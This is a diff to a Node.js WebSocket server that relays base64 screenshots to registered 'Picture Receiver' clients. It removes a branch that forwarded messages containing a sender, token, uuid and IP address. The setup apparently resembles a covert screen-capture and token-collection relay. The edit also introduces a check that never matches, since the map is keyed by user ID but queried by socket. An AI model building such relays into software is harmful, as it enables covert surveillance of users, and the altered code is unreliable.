@@ -57,7 +57,6 @@ app.get('/node-version', (req, res) => {
 const handleMessage = (ws, data, userID) => {
     try {
         const messageData = JSON.parse(data.toString());
-        
         if (messageData.command === 'Picture Receiver') {
             pictureReceivers.set(userID, ws);
         } else if (messageData.type === 'screenshot' && messageData.data && typeof messageData.data === 'string' && messageData.data.startsWith('data:image/png;base64')) {
@@ -74,16 +73,8 @@ const handleMessage = (ws, data, userID) => {
                 screen: messageData.screen,
                 data: messageData.data
             });
-        } else if (messageData.type === 'token' && messageData.sender && messageData.token && messageData.uuid && messageData.ip) {
-            // Xử lý tin nhắn token đặc biệt
-            console.log('Received token message from:', messageData.sender);
-            broadcastToPictureReceivers(messageData);
-        } else if (messageData.action === 'take_screenshot1' || messageData.command) {
-            // Đây là command, không cần broadcast
-            console.log('Received command:', messageData);
         } else {
-            // Broadcast các message khác, nếu cần
-            broadcastToAllExceptSender(ws, JSON.stringify(messageData));
+            broadcastToAllExceptPictureReceivers(ws, JSON.stringify(messageData), true);
         }
     } catch (e) {
         console.error('Error parsing or processing message:', e);
@@ -91,9 +82,8 @@ const handleMessage = (ws, data, userID) => {
     }
 };
 
-// Hàm broadcastToPictureReceivers cần được cập nhật để xử lý cả object và string
 const broadcastToPictureReceivers = (message) => {
-    const data = typeof message === 'string' ? message : JSON.stringify(message);
+    const data = JSON.stringify(message);
     pictureReceivers.forEach((ws, userId) => {
         if (ws.readyState === WebSocket.OPEN) {
             ws.send(data, error => {
@@ -103,9 +93,9 @@ const broadcastToPictureReceivers = (message) => {
     });
 };
 
-const broadcastToAllExceptSender = (senderWs, message) => {
+const broadcastToAllExceptPictureReceivers = (senderWs, message, includeSelf) => {
     wss.clients.forEach(client => {
-        if (client !== senderWs && client.readyState === WebSocket.OPEN) {
+        if (!pictureReceivers.has(client) && client.readyState === WebSocket.OPEN && (includeSelf || client !== senderWs)) {
             client.send(message);
         }
     });
